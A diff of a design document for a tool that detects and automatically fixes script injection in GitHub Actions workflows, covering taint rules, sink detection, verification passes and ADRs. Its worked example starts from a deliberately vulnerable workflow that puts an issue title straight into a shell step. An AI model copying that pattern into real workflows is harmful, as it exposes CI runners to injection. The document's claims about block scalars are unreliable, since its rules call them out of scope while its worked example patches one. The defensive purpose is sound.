-
-**Limits & bails:**
-
-| Check | ReasonCode |
-|-------|------------|
-| File > 2 MB | `FILE_TOO_LARGE` |
-| Invalid UTF-8 | `INVALID_ENCODING` |
-| YAML parse error | `PARSE_ERROR` |
-| Alias bomb (>10) | `YAML_BOMB` |
-
-**Important:** SHA-256 is computed on **raw bytes** before decode. `source_text` preserves
-original line endings for Stage 3 output assembly.
-
----
-
-### `src/cst_auto_remediator/classify.py` — Stage 2 (classification only)
-
-**Role:** Pure functions for expression discovery and taint labels. **No YAML traversal.**
-
-| Function | Description |
-|----------|-------------|
-| `find_expressions(value)` | Regex scan for `${{ ... }}` per logical line; returns `(text, start, end)` offsets **relative to the run scalar string** |
-| `extract_expression_body(text)` | Strip `${{` / `}}` wrapper |
-| `classify_expression(body)` | Apply prefix/exact rules → `Classification` |
-
-**UNTRUSTED rules:** `github.event.*`, `github.head_ref`, `github.base_ref`,
-`fromJSON(inputs.*)`
-
-**TRUSTED rules:** `secrets.*`, `vars.*`, `github.sha`, `github.run_id` (exact)
-
-**AMBIGUOUS:** everything else — **not auto-remediated** (bailout-first)
+### 8. Verification and Certification
+Stage 8 (`verify_output`) runs the verification passes:
+* **SyntaxPass**: Validates that the generated bytes parse successfully under Stage 1 rules.
+* **SemanticPass**: Compares the original and remediated structures, confirming that no settings were altered.
+* **FormatPass**: Confirms that comments and line endings were preserved.
+* **SecurityPass**: Confirms that no active `REMEDIATE` decisions exist in the patched output step.
+* **InvariantPass**: Checks that running the remediator on the output results in no changes (Idempotence) and verifies Copy-on-Write boundaries.
+* If all passes pass, a `VerificationReport` with decision `PASS` is returned, and the safe workflow is certified.
 
 ---
 
-### `src/cst_auto_remediator/traverse.py` — Stage 2 (traversal only)
+## 10. Security Model and Remediation Scope
 
-**Role:** Walk parsed CST and build `ExpressionSite` list. Calls `classify.py`; does not validate or mutate.
+### Classification Vocabulary
+The security model categorizes GHA expression paths into four trust levels:
+1. **Trusted Contexts**: Safe variables that cannot be modified by external users (e.g., `github.repository`, `github.workflow`, `github.sha`, `github.run_id`, `secrets.*`, `vars.*`, `runner.*`).
+2. **Untrusted Contexts**: Contexts populated by external, untrusted input (e.g., `github.event.issue.title`, `github.event.pull_request.body`, `github.head_ref`, `github.base_ref`, `inputs.*`, `matrix.*`).
+3. **Mixed Contexts**: Expressions combining trusted and untrusted variables (e.g., `github.sha + '-' + github.event.issue.title`). These are treated as `UNTRUSTED`.
+4. **Unknown Contexts**: Contexts that cannot be analyzed deterministically (e.g., custom `needs.<job_id>.outputs.<output_id>` or dynamic object structures). These trigger a compiler warning (`ANA001`) and result in a bailout to prevent security gaps.
 
-**Traversal scope (current):** `jobs.<job_id>.steps[].run` for mutation candidates;  
-`jobs.<job_id>.steps[].env` is scanned by `traverse_env_bindings()` for **audit only**
-(already-remediated detection).
+### Taint Propagation Engine
+Taint tracking checks step-level, job-level, and workflow-level environment tables. If a variable is assigned an untrusted expression value, the variable is flagged as tainted:
+```yaml
+env:
+  VULN_VAR: ${{ github.event.issue.title }} # Tainted
+steps:
+  - run: echo "Value is ${{ env.VULN_VAR }}" # Tainted context path, remediated
+```
+This is handled recursively by `classify_env_variable`.
 
-**Block scalar detection:** `LiteralScalarString` / `FoldedScalarString` → `ScalarType.BLOCK`.
-Expressions inside block scalars are still **scanned and reported**; Stage 3 skips them.
+### Remediation Scope (What Version 1 Does and Does NOT Remediate)
 
-**Already-remediated detection:** When `env:` binds an UNTRUSTED `${{ ... }}` and `run:`
-references `$VAR` without embedding the same expression, the pipeline reports
-`SKIPPED` / `ALREADY_REMEDIATED` and leaves the file byte-identical.
+To prevent breaking workflow execution, Version 1 intentionally restricts its remediation scope:
 
----
-
-### `src/cst_auto_remediator/validate.py` — Stage 3 (rule chain only)
-
-**Role:** Decide PATCHED / SKIPPED / BAILED per `ExpressionSite`. **No file I/O, no mutation.**
-
-**Rule order in `validate_site()`:**
-
-1. Block scalar → `SKIPPED` / `BLOCK_SCALAR_OUT_OF_SCOPE`
-2. TRUSTED → `SKIPPED` / `TRUSTED`
-3. AMBIGUOUS → `SKIPPED` / `AMBIGUOUS_EXPRESSION`
-4. Sink detection → `BAILED` (`SINK_EVAL`, `SINK_BASH_C`, `SINK_SH_C`, `SINK_COMMAND_SUBSTITUTION`)
-5. Single-quoted expression → `SKIPPED` / `SINGLE_QUOTED_EXPRESSION`
-6. Env already binds same `${{ ... }}` value → `PATCHED` **run-only** (`insert_env=False`)
-7. Existing env key collision (different value) → `BAILED` / `ENV_NAME_COLLISION`
-8. Two expressions same generated name in one step → `BAILED` / `GENERATED_NAME_COLLISION`
-9. Otherwise → `PATCHED` + new `env:` block (`insert_env=True`)
-
-**Sink notes:** `\beval\b`, `\bbash\s+-c\b`, `\bsh\s+-c\b` only (not `/bin/bash -c` yet).
-`$(...)` and backticks bail only when the **expression span** lies inside that region.
-
-**Per-expression bail:** One bad site does not block patching other sites in the same step.
+| Target Context | Remediation Action | Technical Reason |
+| :--- | :--- | :--- |
+| **Plain Scalar Expressions** | **PATCHED** | Safe to remediate; expression is swapped for a step env variable. |
+| **Single-Quoted Expressions** | **SKIPPED** | Evaluated as a literal string by the shell, preventing execution. |
+| **Already Remediated Env** | **SKIPPED** | The expression is already bound to an env variable, requiring no action. |
+| **Block Scalars (`|`, `>`)** | **BAILED** | Complex multi-line formatting is out of scope for V1. |
+| **Composite Actions** | **BAILED** | Multi-file nested step structures are out of scope for V1. |
+| **Unsupported Shells** | **BAILED** | Shells other than `bash`, `sh`, `pwsh`, or `powershell` are rejected. |
+| **Unsupported Runners** | **BAILED** | Runner configurations that lack a standard default shell are rejected. |
+| **Command Injection Sinks** | **BAILED** | Expressions inside script command expansions (e.g. `$(...)`, `` `...` ``) or shell evaluation statements (`eval`) are rejected. |
+| **Dynamic Script Generation** | **BAILED** | Multi-stage dynamic command strings are out of scope for V1. |
+| **Name Collisions** | **BAILED** | If variable name conflicts cannot be resolved after generating suffix hashes, the compiler bails to avoid overwriting values. |
 
 ---
 
-### `src/cst_auto_remediator/mutate.py` — Stage 3 (mutation + output)
+## 11. Verification Framework (Stage 8 Specification)
 
-**Role:** Apply approved patches and produce final YAML string.
+Stage 8 acts as a separate certification layer that runs outside the main compiler pipeline to verify the serialized output. It prevents compiler bugs or AST corruption from silently introducing regressions.
 
-| Function | Description |
-|----------|-------------|
-| `apply_patches(document, patches)` | In-place CST edit: insert `env:` before `run`, replace `${{ ... }}` with `$VAR` in run scalar |
-| `serialize_document(document)` | ruamel dump — used to verify CST is dumpable (not the primary output path) |
-| `build_patched_text(original, patches, line_ending)` | **Primary output:** surgical text edit preserving untouched bytes and **original line endings** |
-| `assert_byte_preservation(...)` | Enforced check: only run + new env lines may differ |
+### Verification Passes
 
-**Why two mutation paths?** Full ruamel re-dump reformatted unrelated lines. CST edits
-drive *what* changes; `build_patched_text` drives *how* the file bytes are assembled.
+```mermaid
+graph TD
+    VC[VerificationContext] --> P1[Pass 1: SyntaxPass]
+    P1 --> P2[Pass 2: SemanticPass]
+    P2 --> P3[Pass 3: FormatPass]
+    P3 --> P4[Pass 4: SecurityPass]
+    P4 --> P5[Pass 5: InvariantPass]
+    P5 --> VR[VerificationReport]
+```
 
----
+* **Pass 1: SyntaxPass (Syntax and Parse Integrity)**
+  * Evaluates if the output bytes are valid YAML.
+  * Re-parses the output using Stage 1 constraints to confirm syntax validity.
+  * *Diagnostics*: `VER001`. *Invariants*: `INV-LINE`.
+* **Pass 2: SemanticPass (Semantic Isomorphism)**
+  * Verifies that the workflow semantics are preserved.
+  * Confirms that settings like triggers, names, jobs, permissions, and step configurations are identical.
+  * Reconstructs the output run command to confirm that the changes match the planned patch.
+  * *Diagnostics*: `VER002`. *Invariants*: `INV-SEME`.
+* **Pass 3: FormatPass (Layout and Spacing Preservation)**
+  * Verifies that comments and line endings are preserved.
+  * Checks for comment loss and confirms that anchors, aliases, and merge keys are intact.
+  * *Diagnostics*: `VER004`, `VER005`, `VER006`. *Invariants*: `INV-LINE`, `INV-COMM`.
+* **Pass 4: SecurityPass (Security Classification)**
+  * Runs Stage 5 security analysis on the output to confirm it is secure.
+  * Verifies that no patched steps contain remaining `REMEDIATE` decisions.
+  * Confirms that steps requiring a `BAILOUT` were not silently marked safe.
+  * *Diagnostics*: `VER003`. *Invariants*: `INV-SECR`.
+* **Pass 5: InvariantPass (Compiler Boundaries and Invariants)**
+  * Verifies that consecutive remediation runs produce identical output (Idempotence).
+  * Confirms that repeated runs on the same input yield the same byte layout (Determinism).
+  * Verifies structural sharing and Copy-on-Write behavior.
+  * *Diagnostics*: `VER007`, `VER008`, `VER009`, `VER010`, `VER011`. *Invariants*: `INV-COW`, `INV-NODE`, `INV-BYTE`, `INV-IDEM`, `INV-DET`.
 
-### `src/cst_auto_remediator/pipeline.py` — Orchestrator
+### Diagnostic Codes Reference (`VER001`-`VER012`)
 
-**Role:** `remediate_file(path) -> (yaml_out | None, report[])`
-
-1. `ingest()` — bail early on Stage 1 failure
-2. `traverse_jobs()` — collect run expression sites
-3. `traverse_env_bindings()` — detect already-remediated steps (report only)
-4. For each run site: `validate_site()` → build `ReportEntry` (includes offsets)
-5. Collect `PlannedPatch` for PATCHED sites (may be run-only if env already binds expr)
-6. If patches: `apply_patches` + `build_patched_text(source_text, line_ending)`
-7. `assert_byte_preservation`
-8. Return unchanged `source_text` if no patches needed
-
----
-
-## Fixtures (test scenarios)
-
-| Fixture | Expected action | Purpose |
-|---------|-----------------|---------|
-| `clean_passthrough.yml` | PATCHED | Plain scalar, UNTRUSTED, no env collision |
-| `bail_sink.yml` | BAILED / SINK_EVAL | Expression inside `eval` |
-| `bail_collision.yml` | BAILED / ENV_NAME_COLLISION | Pre-existing `ISSUE_TITLE` env key |
-| `block_scalar_flagged.yml` | SKIPPED / BLOCK_SCALAR_OUT_OF_SCOPE | `run: \|` — detected, not mutated |
-| `crlf_preservation.yml` | PATCHED | File saved with `\r\n`; guards line-ending regression |
-| `clean_passthrough2.yml` | SKIPPED / ALREADY_REMEDIATED | Already-fixed workflow; must pass through unchanged |
-
-Each fixture has `*.expected.json`. Patched fixtures also have `*.expected.yml`.
-
-### `testing/` scenarios (complex integration)
-
-| Input | Purpose |
-|-------|---------|
-| `multi_step_mixed.yml` | Mixed: already-remediated + vulnerable + block + eval sink in one file |
-| `partial_env_run_only.yml` | Env binds expression but run still has `${{ ... }}` — run-only patch |
-
-Run: `python testing/run_scenarios.py` → writes `testing/output/` for manual review.
-
-**Offset reference (run_value slice verification):**
-
-| Fixture | start | end |
-|---------|-------|-----|
-| clean_passthrough | 22 | 53 |
-| bail_sink | 11 | 42 |
-| bail_collision | 22 | 53 |
-| block_scalar_flagged | 22 | 53 |
-| crlf_preservation | 6 | 37 |
-
-Verify: `run_value[start:end] == expression_text`
+| Code | Severity | Description | Triggering Condition |
+| :--- | :--- | :--- | :--- |
+| **VER001** | FAIL | Parse failure | The generated output YAML is syntactically invalid or empty. |
+| **VER002** | FAIL | Semantic mismatch | Global trigger, job steps, or step settings differ from the original. |
+| **VER003** | FAIL | Security failure | A patched step contains remaining vulnerabilities or a bailout was skipped. |
+| **VER004** | FAIL | Formatting failure | Formatting changes (such as modified indents or altered anchors) detected in untouched sections. |
+| **VER005** | WARNING | Comment loss | Comments were modified or dropped in the output. |
+| **VER006** | WARNING | Line ending change | The dominant line-ending convention (LF vs CRLF) was not preserved. |
+| **VER007** | FAIL | CoW violation | A mutated CST node shares its python object identity with the original node. |
+| **VER008** | FAIL | Structural sharing failure | An untouched sibling node did not preserve its python object identity. |
+| **VER009** | FAIL | Idempotence failure | Re-running the remediator on the output modified its contents. |
+| **VER010** | FAIL | Determinism failure | Repeated runs on identical files generated divergent bytes. |
+| **VER011** | FAIL | Unexpected mutation | A node was modified outside the planned patch scope. |
+| **VER012** | FAIL | Internal verifier error | Stage 8 encountered an unhandled exception during verification. |
 
 ---
 
-## Tests & manual verification
+## 12. Testing Strategy
 
+The test suite covers both unit and integration verification. As of Version 1, **199 tests pass successfully** with zero failures.
+
+### Test Categories
+
+* **Parser Tests**: Validate Stage 1 ingestion limits, encoding validation, and YAML bomb protections.
+* **CST Structural Tests**: Validate Stage 2 node creation, structural equality checks, and copy-on-write transformations.
+* **Semantic Builder Tests**: Validate semantic mapping correctness and checking of structural diagnostics GHA001-GHA010.
+* **Metadata Provider Tests**: Verify step scopes, position spans, default shells, and duplicate expression tracking.
+* **Security Analyzer Tests**: Verify expression trust classification, taint propagation, shell checks, and security warnings ANA001-ANA005.
+* **Planner and Transformer Tests**: Verify that mutation plans generate safe environment variable names and resolve naming collisions.
+* **Serializer Tests**: Verify that formatting, line endings, comments, and spacing are preserved.
+* **Verification Tests**: Verify that Stage 8 detects syntax mismatches, comment drift, structural changes, and security regressions.
+* **Edge Case and Regression Tests**: Test edge cases (such as merge keys, CRLF line endings, and duplicate expressions) to prevent regression.
+* **Massive Workflow Tests**: Test the pipeline on large, real-world GitHub Action workflows to ensure performance and correctness.
+
+---
+
+## 13. Current Status (Version 1)
+
+### Implemented Capabilities
+* **Stage 1-8 Core Pipeline**: Fully implemented and certified.
+* **Lossless Serializer**: Fully functional; preserves line endings, indents, and comments.
+* **Verification Framework**: Complete with all five verification passes (Syntax, Semantic, Format, Security, Invariant).
+* **Deterministic Classifier**: Implements taint tracking and runner/shell capability checks.
+* **POSIX-safe Naming Engine**: Implements name collision resolution with hash suffixes.
+* **Test Suite**: Fully functional with 199 passing tests.
+
+### Deprecated Components
+* **Legacy Pipeline Modules**: The modules `cst_auto_remediator.traverse`, `cst_auto_remediator.classify`, and `cst_auto_remediator.validate` are deprecated and will be removed in a future release. They are preserved only for backward compatibility.
+
+### Not Implemented (Out of Scope for Version 1)
+* Deep traversal of composite actions (`uses:` referencing local folders).
+* Automated remediation of block scalar scripts (`run: |` or `run: >`).
+* Automatic quoting conversion (e.g., converting single quotes to double quotes).
+* Obfuscated sink analysis (such as dynamic commands generated at runtime via shell redirects).
+
+---
+
+## 14. Known Limitations
+
+* **Multi-Document YAML Files**: Version 1 assumes a single YAML document per file. Files containing multiple documents separated by `---` are not supported.
+* **Composite Action Deep Verification**: The compiler checks only workflow files. Steps defined within external composite actions are not resolved.
+* **Future GHA Syntax Additions**: The semantic model represents the current GitHub Actions schema. Future syntax additions may require updates to the semantic builder.
+* **Block Scalar Formatting**: Block scalars are skipped because editing multi-line shell scripts while preserving spacing is complex.
+* **Nested Shell Script Transformations**: The rewriter replaces simple expressions but does not parse or update nested shell syntax (such as variables referenced within nested `awk` or `perl` scripts).
+
+---
+
+## 15. Future Roadmap
+
+### Version 1.1: Backend Integration
+* **REST APIs**: Package the compiler into a FastAPI backend service.
+* **Verification Reports**: Expose verification outputs via structured JSON reports.
+* **Docker Image**: Containerize the remediation engine for deployment.
+
+### Version 1.2: User Interfaces
+* **React Web UI**: Build an interactive web dashboard using TypeScript and Tailwind CSS.
+* **Google Stitch UI**: Integrate the UI into the Google Stitch design system.
+
+### Version 2: Compiler Research Extensions
+* **Block Scalar Parser**: Parse and remediate block scalar shell scripts.
+* **Composite Action Support**: Traverse and patch steps in local composite actions.
+* **Automatic Quote Flipping**: Convert single-quoted strings containing expressions to double-quoted strings for variable evaluation.
+
+### Version 3: Developer Tooling and Cloud Integration
+* **GitHub App**: Implement automated Pull Request patches and safety checks.
+* **VS Code Extension**: Real-time editor warnings and quick-fix actions.
+* **Enterprise Cloud Deployment**: Scale backend workers to scan and patch repositories across organization accounts.
+
+---
+
+## 16. Research Contributions
+
+The CST Auto-Remediator introduces seven core contributions to security research:
+
+1. **Deterministic Remediation**: Replaces heuristics with deterministic, AST-level transformations.
+2. **Lossless Format Preservation**: Demonstrates that security patches can be applied without altering formatting.
+3. **8-Stage Compiler Architecture**: Adapts compiler design principles to security remediation.
+4. **External Verification**: Separates compilation from verification, providing independent certification of correctness.
+5. **Copy-on-Write CST**: Uses immutable Green trees to apply safe, layout-preserving modifications.
+6. **Security Certification**: Introduces a framework that verifies safety properties after serialization.
+7. **Semantic Preservation**: Ensures that non-security-related settings are not modified.
+
+---
+
+## 17. Contribution Guide
+
+To maintain code quality, contributors must adhere to the following rules:
+
+### Stage Decoupling Rules
+* Stage boundaries must be respected. Never import downstream modules from upstream packages (e.g. `yaml_cst` must never import `gha_analysis` or `gha_transform`).
+* Never run network requests, access databases, or write to the file system within a compiler stage. Stages must remain pure, in-memory transformations.
+* Keep AST and Semantic nodes pure and syntax-focused. Never add analysis state fields (e.g. `classification`, `remediated`, `bailout_reason`) to `YamlNode` or `Step` classes. Map these properties in metadata providers or analysis registries instead.
+
+### Coding Conventions
+* All compiler changes must preserve idempotency.
+* Write comprehensive unit tests for any new features under the `tests/` directory.
+* Run the test suite before submitting changes:
 ```powershell
-pip install -e ".[dev]"
-pytest tests -v
-python verify_basic.py
-python verify_diff.py
-python verify_diff2.py
-python testing/run_scenarios.py
+.venv\Scripts\pytest
 ```
-
-After changing expected outputs intentionally:
-
+* Ensure all 199 tests pass. If expected fixtures change, update them using the regeneration script:
 ```powershell
 python scripts/regenerate_expected.py
 ```
 
 ---
 
-## Architectural Stage Guidelines & Invariants
+## 18. Glossary
 
-To maintain a clean compiler structure, the following stage definitions and boundary rules are enforced:
-
-### 1. Stage Ownership Matrix
-
-| Stage | Owns |
-| :--- | :--- |
-| **Stage 1** | Parsing only |
-| **Stage 2** | Syntax only |
-| **Stage 3** | Semantics only |
-| **Stage 4** | Metadata only |
-| **Stage 5** | Security analysis only |
-| **Stage 6** | Mutation only |
-| **Stage 7** | Verification only |
-| **Stage 8** | Serialization only |
-
-### 2. Semantic Model Scope
-Stage 3 models the general **GitHub Actions execution structure**, while Version 1 actively analyzes only `RunCommand` and `EnvBinding` expression sites.
-
-### 3. Metadata Invariant: Facts, Not Decisions
-Metadata Providers (Stage 4) gather objective facts about the CST/Semantic structure, they **never** make security decisions (which are deferred entirely to Stage 5):
-* **Good Metadata (Stage 4)**: Effective shell, runner, env scopes, node paths, offset maps, duplicate expressions, step/run ordering.
-* **Bad Metadata (Stage 4 - DO NOT DO)**: Trusted, untrusted, dangerous, vulnerable, malicious.
-
-### 4. ExpressionSite Purity
-`ExpressionSite` nodes remain strictly **syntax-oriented**. They represent syntax locations and character indices only. 
-We must **not** add metadata or analysis fields (such as `classification`, `reason`, `sink`, `severity`, or `patched`) directly to the `ExpressionSite` syntax/semantic node. Those facts and findings belong to Stage 4 (Metadata) and Stage 5 (Security Analysis / Finding logs) registries.
+* **Abstract Syntax Tree (AST)**: A tree representation of code structure that omits formatting details like whitespace, comments, and delimiters.
+* **Concrete Syntax Tree (CST)**: A lossless tree representation that preserves every character of the source code, including formatting.
+* **Green Tree**: An immutable, parent-free syntax tree containing all formatting details, suitable for structural sharing.
+* **Red Tree**: A mutable syntax tree that includes parent pointers and absolute source offsets, constructed on top of a Green Tree.
+* **Copy-on-Write (CoW)**: An optimization where modified nodes are duplicated while unmodified siblings are shared.
+* **Structural Sharing**: Sharing unmodified subtrees by reference between different versions of a data structure.
+* **Taint Analysis**: A security analysis technique that tracks the flow of untrusted input to sensitive command sinks.
+* **Semantic Model**: A model representing GHA workflow concepts (Jobs, Steps, Runs) constructed from raw syntax nodes.
+* **Metadata Wrapper**: An external registry that maps properties to AST/Semantic nodes without modifying the nodes.
+* **Verification Pass**: A check that evaluates the output document against syntax, semantic, or formatting invariants.
+* **Idempotence**: A property where applying an operation multiple times yields the same result.
+* **Determinism**: A property where an operation always produces the identical output for a given input.
+* **GitHub Actions Expression**: Syntax denoted by `${{ ... }}` evaluated dynamically by the runner.
+* **YAML Scalar Styles**: Formatting styles for text values, including `PLAIN`, `SINGLE_QUOTED`, `DOUBLE_QUOTED`, `FOLDED`, and `LITERAL`.
 
 ---
 
-## Known gaps (future sessions — do not “fix” silently)
+## 19. Comprehensive End-to-End Execution Example
 
-- Block scalar (`run: |` / `>`) remediation — detected only
-- `/bin/bash -c`, `env bash -c` sink variants
-- Single-quoted run flip to double-quoted for `$VAR` expansion
-- Hash-suffix env name collision fallback (architecture doc) — currently bails with `GENERATED_NAME_COLLISION`
-- CLI, sidecar report files, Stages 4+ — not implemented
-- Traversal beyond `jobs.*.steps[].run`
+This section traces a complete transformation of a workflow YAML containing two distinct vulnerabilities.
+
+### 19.1 Input Workflow
+```yaml
+# Workflow to build and announce releases
+name: Release Announcer
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Alert Issue Details
+        run: |
+          echo "Title: ${{ github.event.issue.title }}"
+          echo "Author: ${{ github.event.issue.user.login }}"
+```
+
+### 19.2 Stage 1: Ingest & Parse
+* **Operation**: Ingests bytes, verifies they are within the 2 MB limit, and parses using `ruamel.yaml`.
+* **Output**: `ruamel.yaml` parsed document model mapping the structure. Dominant line endings detected as `\n`.
+
+### 19.3 Stage 2: Concrete Syntax Tree
+* **Operation**: Recursively wraps the `ruamel.yaml` object into typed CST nodes.
+* **Output**: A lossless `YamlDocument` representing the parsed nodes. The second step's script is captured as a `YamlScalar` at line 17 with style `LITERAL`.
+
+### 19.4 Stage 3: Semantic Reconstruction
+* **Operation**: Analyzes the CST structure and builds GHA nodes.
+* **Output**: `SemanticBuildResult` containing a `Workflow` node mapping the `notify` job and its two steps. For Step 1 (`Alert Issue Details`), the balanced brace scanner extracts two `ExpressionSite` instances from the `run` command script scalar:
+  * **Site 1**: `${{ github.event.issue.title }}` (start_offset=18, end_offset=48)
+  * **Site 2**: `${{ github.event.issue.user.login }}` (start_offset=67, end_offset=102)
+
+### 19.5 Stage 4: Metadata Separation
+* **Operation**: Resolves context metadata and registers findings by node IDs.
+* **Output**: `MetadataWrapper` caching:
+  * **PositionMetadata**: Links Site 1 and Site 2 to step `1` run node.
+  * **ScopeMetadata**: Maps step scope (inherits workflow global variables).
+  * **ShellMetadata**: Resolves `bash` shell with standard execution capabilities.
+  * **ExpressionMetadata**: Assigns stable path IDs:
+    * Site 1 ID: `jobs.notify.steps.1.run.exprs.0`
+    * Site 2 ID: `jobs.notify.steps.1.run.exprs.1`
+
+### 19.6 Stage 5: Security Analysis
+* **Operation**: Analyzes expression taints.
+* **Output**: `SecurityAnalysisResult` containing:
+  * **Site 1**: Paths starting with `github.event.issue.title` are classified as `UNTRUSTED`. Since the runner shell is `bash` and the sink is a plain run command, the decision is `AnalysisDecision.REMEDIATE` (triggers diagnostic `ANA004`).
+  * **Site 2**: Paths starting with `github.event.issue.user.login` are classified as `UNTRUSTED` (triggers diagnostic `ANA004`).
+
+### 19.7 Stage 6: Mutation Planning
+* **Operation**: Resolves names and generates replacements.
+* **Output**: `MutationPlan` containing a `StepMutation` for step `1` with:
+  * **EnvVarEntry 1**: `GITHUB_EVENT_ISSUE_TITLE` mapped to `${{ github.event.issue.title }}`
+  * **EnvVarEntry 2**: `GITHUB_EVENT_ISSUE_USER_LOGIN` mapped to `${{ github.event.issue.user.login }}`
+  * **SiteReplacement 1**: Replaces Site 1 with `$GITHUB_EVENT_ISSUE_TITLE`.
+  * **SiteReplacement 2**: Replaces Site 2 with `$GITHUB_EVENT_ISSUE_USER_LOGIN`.
+
+### 19.8 Stage 7: Format-Preserving Transformation
+* **Operation**: Rebuilds the CST via CoW, copies `ruamel.yaml` elements, and serializes the tree back to bytes.
+* **Output**: Safe workflow output bytes. Spaces, blank lines, and original comments are preserved.
+
+### 19.9 Stage 8: Verification & Certification
+* **Operation**: Feeds `VerificationContext` to verification passes.
+* **Output**:
+  * **SyntaxPass**: `PASS` (valid syntax).
+  * **SemanticPass**: `PASS` (settings isomorphic, run edits correspond to mutations).
+  * **FormatPass**: `PASS` (comment headers, spacing, and trailing newlines match original).
+  * **SecurityPass**: `PASS` (unremediated targets remaining: 0).
+  * **InvariantPass**: `PASS` (idempotence, determinism, and CoW structures certified).
+  * **Decision**: `VerificationDecision.PASS`.
+
+### 19.10 Output Workflow
+```yaml
+# Workflow to build and announce releases
+name: Release Announcer
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Alert Issue Details
+        env:
+          GITHUB_EVENT_ISSUE_TITLE: ${{ github.event.issue.title }}
+          GITHUB_EVENT_ISSUE_USER_LOGIN: ${{ github.event.issue.user.login }}
+        run: |
+          echo "Title: $GITHUB_EVENT_ISSUE_TITLE"
+          echo "Author: $GITHUB_EVENT_ISSUE_USER_LOGIN"
+```
 
 ---
 
-## Change log (secretary record)
+## Appendix: Architecture Decision Records (ADRs)
 
-| Date | Change |
-|------|--------|
-| 2026-06-24 | Initial Stages 1–3 implementation with ruamel CST |
-| 2026-06-24 | Fixed report offsets (`start_offset`/`end_offset` threaded through `ReportEntry`) |
-| 2026-06-24 | Fixed CRLF preservation via `FileMetadata.line_ending` + `build_patched_text` |
-| 2026-06-24 | Added `crlf_preservation` fixture; `explanation.md` created as project secretary |
-| 2026-06-24 | Added `ALREADY_REMEDIATED` detection, run-only patch for partial env binding |
-| 2026-06-24 | Fixed `clean_passthrough2.yml` to already-remediated form; added `testing/` scenarios |
-| 2026-06-28 | Completed Stage 2 Green CST Construction, enhanced copy-on-write methods, added structural equality, and added comprehensive test suite |
-| 2026-06-28 | Completed Stage 3 GHA Semantic Layer: scanner, nodes, builder, diagnostics (GHA001-GHA010), and test_stage3_comprehensive.py |
-| 2026-06-28 | Completed Stage 4 GHA Metadata Providers: wrapper cache engine, Position, Scope, Shell, and Expression providers, and test_stage4_comprehensive.py |
-| 2026-06-28 | Completed Stage 5 GHA Security Analysis: enums, nodes, classifier, validator, diagnostics (ANA001-ANA005), analyzer, and test_stage5_comprehensive.py |
-| 2026-06-29 | Integrated all stage 3 workflows and security/yaml edge case datasets into the automated test suite; fixed parser unpacking TypeError for merge keys in `builder.py`; resolved syntax issues in edge cases |
+### ADR 001: Concrete Syntax Tree (CST) vs. Abstract Syntax Tree (AST)
+* **Context**: Rebuilding workflows requires parsing YAML and modifying command strings. An AST model omits layout details, which would cause the serializer to lose comments and formatting.
+* **Decision**: We use a Concrete Syntax Tree (CST) to represent the YAML structure. This preserves 100% of formatting details across modifications.
+* **Consequences**: Tree modification requires Copy-on-Write traversal to rebuild paths, but formatting remains intact.
 
----
+### ADR 002: Selection of `ruamel.yaml` as the Parsing Engine
+* **Context**: The parser must load YAML in a round-trip mode that preserves comment nodes, quoting styles, and map keys.
+* **Decision**: We use `ruamel.yaml` in round-trip mode (`rt`). It tracks comments, quote styles, and block styles, and supports updating and dumping structured trees.
+* **Consequences**: `ruamel.yaml` is slow and complex, but it is the most reliable Python library for format-preserving round-trip parsing.
 
-## Instructions for the next contributor (human or AI)
+### ADR 003: Immutable Dataclasses for Green CST Nodes
+* **Context**: Modifying a syntax tree during compiler passes can introduce side effects if nodes are mutable.
+* **Decision**: We define CST nodes as immutable dataclasses (`frozen=True`).
+* **Consequences**: Modifying a node requires returning a new instance via `replace`. This prevents modification side effects and allows structural sharing.
 
-1. Read this file first.
-2. Read `pipeline.py` for the end-to-end flow.
-3. Run `pytest tests -v` before and after your change.
-4. If behavior changes, update fixtures via `scripts/regenerate_expected.py` and verify offsets manually.
-5. **Update this `explanation.md`** — especially the change log and any new gaps/fixtures.
-6. Do not add LLM-based fix decisions; keep enums and rules deterministic.
+### ADR 004: Decoupling Stage 8 Verification
+* **Context**: Bugs in the compiler or serializer could produce malformed or invalid YAML output.
+* **Decision**: We implement Stage 8 as a separate verification layer. It treats the output as untrusted and re-parses and validates it independently.
+* **Consequences**: Simplifies testing and guarantees that generated output is valid, semantically isomorphic, and secure.
+
+### ADR 005: Decoupling Network Operations
+* **Context**: Future REST APIs and integrations will require network access (e.g. fetching workflows from GitHub APIs).
+* **Decision**: We exclude network and database operations from the core compiler. These will be handled by a separate FastAPI application layer.
+* **Consequences**: Keeps the compiler decoupled, testable, and safe to run in isolated environments.
